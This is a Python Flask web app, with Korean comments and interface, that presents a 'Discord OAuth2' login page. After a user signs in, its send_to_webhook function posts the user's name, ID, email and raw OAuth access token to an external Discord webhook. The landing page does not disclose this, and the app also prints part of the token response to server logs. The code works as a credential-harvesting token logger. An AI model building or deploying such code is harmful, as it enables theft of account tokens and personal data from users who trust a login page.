import os
import requests
import time
import traceback
from flask import Flask, request, redirect

# ============================================================
# Render 환경변수
# ============================================================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
# ============================================================

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord OAuth2 로그인</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }
            .container {
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }
            h1 { color: #58a6ff; margin-bottom: 10px; }
            p { color: #8b949e; margin-bottom: 30px; }
            .btn {
                background: #5865f2;
                color: white;
                padding: 14px 40px;
                border: none;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: background 0.2s;
            }
            .btn:hover { background: #4752c4; }
            .footer { margin-top: 20px; font-size: 12px; color: #484f58; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Discord OAuth2</h1>
            <p>디스코드 계정으로 간편하게 로그인하세요</p>
            <a href="/login" class="btn">🚀 디스코드로 로그인</a>
            <div class="footer">개발자: gg</div>
        </div>
    </body>
    </html>
    '''

@app.route('/login')
def login():
    # 🔥 redirect_uri를 명시적으로 포함
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify+email"
    )
    return redirect(discord_auth_url)

@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    if not code:
        return "❌ 인증 코드가 없습니다.", 400
    
    print(f"📩 받은 코드: {code[:20]}...")
    
    try:
        # 🔥 직접 토큰 교환 (discord-oauth2.py 안 씀!)
        token_data = exchange_code_for_token(code)
        
        if not token_data:
            return "❌ 토큰 교환 실패", 500
        
        # 사용자 정보 가져오기
        user_info = get_user_info(token_data['access_token'])
        
        # 웹훅 전송
        send_to_webhook(token_data, user_info)
        
        return success_page(user_info)
        
    except Exception as e:
        error_msg = str(e)
        print(f"❌ 오류: {error_msg}")
        print(traceback.format_exc())
        
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json={
                "content": f"❌ **로그인 실패!**\n```\n{error_msg[:500]}\n```"
            })
        
        return f"❌ 오류: {error_msg}", 500

def exchange_code_for_token(code):
    """코드를 액세스 토큰으로 교환 (직접 구현)"""
    
    # Rate Limit 대비 (2초 대기)
    time.sleep(2)
    
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    response = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers=headers)
    
    print(f"📨 토큰 교환 응답 코드: {response.status_code}")
    print(f"📨 응답 내용: {response.text[:200]}...")
    
    if response.status_code == 200:
        return response.json()
    else:
        # Rate Limit 체크
        if response.status_code == 429:
            retry_after = response.headers.get('Retry-After', 5)
            print(f"⏳ Rate Limit: {retry_after}초 후 재시도")
            time.sleep(int(retry_after))
            # 재시도
            return exchange_code_for_token(code)
        return None

def get_user_info(access_token):
    """액세스 토큰으로 사용자 정보 가져오기"""
    headers = {
        'Authorization': f'Bearer {access_token}'
    }
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    
    if response.status_code == 200:
        return response.json()
    return None

def send_to_webhook(token_data, user_info):
    if not WEBHOOK_URL or not user_info:
        return
    
    webhook_data = {
        "content": f"🔑 **{user_info.get('username')}** 님이 로그인했습니다!",
        "embeds": [{
            "title": "👤 사용자 정보",
            "color": 0x5865F2,
            "fields": [
                {"name": "📛 사용자명", "value": user_info.get('username', 'N/A'), "inline": True},
                {"name": "🆔 ID", "value": f"`{user_info.get('id', 'N/A')}`", "inline": True},
                {"name": "📧 이메일", "value": user_info.get('email', '비공개'), "inline": True},
                {"name": "🔑 Access Token", "value": f"```{token_data.get('access_token', 'N/A')}```", "inline": False}
            ],
            "footer": {"text": f"로그인 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

def success_page(user_info):
    username = user_info.get('username', 'Unknown')
    email = user_info.get('email', 'N/A')
    user_id = user_info.get('id', 'N/A')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>로그인 성공!</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }}
            .container {{
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                max-width: 500px;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }}
            h1 {{ color: #3fb950; margin-bottom: 10px; }}
            .info {{
                text-align: left;
                background: #0d1117;
                padding: 20px;
                border-radius: 8px;
                margin: 20px 0;
                border: 1px solid #30363d;
            }}
            .info p {{ margin: 8px 0; }}
            .label {{ color: #8b949e; font-size: 12px; }}
            .value {{ color: #c9d1d9; font-weight: bold; }}
            .btn {{
                background: #238636;
                color: white;
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
            }}
            .btn:hover {{ background: #2ea043; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #484f58; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ 로그인 성공!</h1>
            <p>웹훅으로 정보가 전송되었습니다.</p>
            <div class="info">
                <p><span class="label">사용자명</span><br><span class="value">{username}</span></p>
                <p><span class="label">이메일</span><br><span class="value">{email}</span></p>
                <p><span class="label">사용자 ID</span><br><span class="value">{user_id}</span></p>
            </div>
            <a href="/" class="btn">🏠 홈으로</a>
            <div class="footer">gg • Discord OAuth2</div>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
